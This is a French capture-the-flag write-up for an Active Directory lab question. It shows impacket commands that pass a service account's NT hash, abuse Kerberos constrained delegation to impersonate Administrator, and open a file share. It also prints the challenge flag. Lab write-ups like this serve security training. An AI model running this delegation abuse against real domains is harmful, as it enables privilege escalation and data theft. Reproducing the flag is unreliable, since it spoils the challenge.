---
title: "FBI Valdoria Q11 · Deep Archive"
platform: "HackerLab Benin 2026"
category: "ad"
difficulty: "—"
points: 100
os: "Windows"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/fbi-ad/11-deep-archive.md"
tags: [hackerlab-benin-2026, ad]
status: published
---

# FBI Valdoria : Q11 · Deep Archive (100 pts)

> *« Documents classifiés sur FS01, niveau d'accès supérieur requis. »*

## TL;DR

Chaîne **Constrained Delegation (S4U)** classique : `svc_mssql` a `msDS-AllowedToDelegateTo: cifs/FS01` + `TRUSTED_TO_AUTH_FOR_DELEGATION` (UAC 0x1010200). Avec son hash NT, on usurpe `Administrator` via S4U2Self + S4U2Proxy et on lit le share `SQL-Delegated`.

**Flag** : `HLB2026{CONSTRAINED_DELEGATION_S4U_SERVICE_IMPERSONATION}`

## Prérequis

- Credentials `svc_mssql` : NT hash `cfc04d466ea6723e12b6bbd51a1857b3` (extrait d'`ad_security_audit.txt` en Q8).
- Realm : `VALDORIA.FBI.LAB` (visible via la réponse `getST`).

## Exploitation

```bash
export KRB5_CONFIG=krb5.conf       # realm + kdc dc01 172.28.X.2
export KRB5CCNAME=svc_mssql.ccache

getTGT.py "VALDORIA.FBI.LAB/svc_mssql" \
    -hashes :cfc04d466ea6723e12b6bbd51a1857b3 \
    -dc-ip 172.28.X.2

getST.py -spn cifs/FS01.valdoria.fbi.lab \
    -impersonate Administrator \
    -k -no-pass -dc-ip 172.28.X.2 \
    'VALDORIA.FBI.LAB/svc_mssql'
```

## Accès à FS01

```bash
export KRB5CCNAME=Administrator@cifs_FS01.valdoria.fbi.lab@VALDORIA.FBI.LAB.ccache
smbclient.py -k -no-pass FS01.valdoria.fbi.lab
> shares
> use SQL-Delegated
> ls
```

Le partage `SQL-Delegated` contient le flag et d'autres credentials (dont `svc_web`, utile pour Q12).

## Flag

```
HLB2026{CONSTRAINED_DELEGATION_S4U_SERVICE_IMPERSONATION}
```
